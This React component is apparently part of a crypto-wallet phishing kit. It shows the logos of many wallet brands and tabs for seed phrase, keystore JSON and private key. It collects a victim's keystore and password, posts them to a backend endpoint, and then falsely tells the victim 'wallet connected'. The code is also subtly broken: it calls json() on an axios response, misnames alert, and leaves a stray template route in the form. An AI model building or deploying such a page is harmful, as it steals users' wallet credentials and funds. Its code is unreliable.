import aion from '../assets/images/aion.png';
import algo from '../assets/images/algo.jpg';
import authereum from '../assets/images/authereum.png';
import bitkeep from '../assets/images/bitkeep.png';
import coinomi from '../assets/images/coinomi.png';
import digitex from '../assets/images/digitex.png';
import enji from '../assets/images/enji.png';
import ethereum from '../assets/images/ethereum-classic.png';
import React, { useEffect, useState } from "react";
import axios from 'axios';
import { Link } from 'react-router-dom';

export default function Form2(){
  const [userData, setUserData] = useState({
    keystore: "", password: "",
  })

  const {keystore , password} = userData

  const handleTextChange = (e) =>{
    setUserData((prevData) => ({...prevData, [e.target.name]:e.target.value,}))
    // setUserData({[e.target.placeholder]:e.target.value})
  }
  const registerUser = async() => {
    console.log("work")
    try {
      const requiredFormFields = {keystore , password}
      const response = await axios
      .post('http://localhost:5001/keystore', requiredFormFields)

      let data = await response.json()

      console.log(data, response, "response")
      response.status === 200 ? alert("wallet connected") : Alert("bad request")
      
      let userDetails = response.data
    }catch(err){}
  }
    return(
    
<section>
<div class="tab">
<Link to="/pharse" class="tablinks" >Phrase</Link>
      <Link to="/keystore" class="tablinks">Keystore JSON</Link>
      <Link to="/private" class="tablinks">Private Key</Link>
    </div>
  


    <div class="card">
        <form action="{{url_for('fuck3')}}" method="POST">
          
            <div class="input-container">
              <div class="ov">
                <input class="input-field" type="text" placeholder="Keystore"  onChange={handleTextChange}
               name="keystore"></input>
                <br></br>
                <input class="input-field" type="password" placeholder="password"  onChange={handleTextChange}
                name="password"></input>
              </div>
              
            </div>
          
            <input class="sub" type="submit" value="connect" onclick={registerUser}></input>
          
           
          </form>
  </div>
</section>
    
    
    

  
 
   
  
 
  

  


  

    )
}